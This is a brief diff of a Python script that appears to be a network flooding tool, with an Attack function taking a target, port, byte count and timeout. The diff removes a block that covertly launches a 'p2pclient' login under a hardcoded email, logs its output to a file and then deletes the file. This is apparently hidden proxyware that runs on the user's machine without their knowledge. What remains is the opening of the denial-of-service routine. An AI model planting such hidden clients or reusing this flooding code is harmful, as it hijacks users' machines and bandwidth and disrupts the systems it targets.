@@ -3,12 +3,6 @@
 import socket,time,threading,sys,random,os,subprocess,requests,urllib.request
 from termcolor import colored
 
-with open('test.txt', 'w') as f:
-    process = subprocess.Popen(['p2pclient', '--login', 'war030578@gmail.com'],
-    stdout=f,
-    stderr=f)
-os.remove("test.txt")
- 
 def Attack(target, port, kbytes, timeout):
     try:
         Bytes=os.urandom(kbytes)
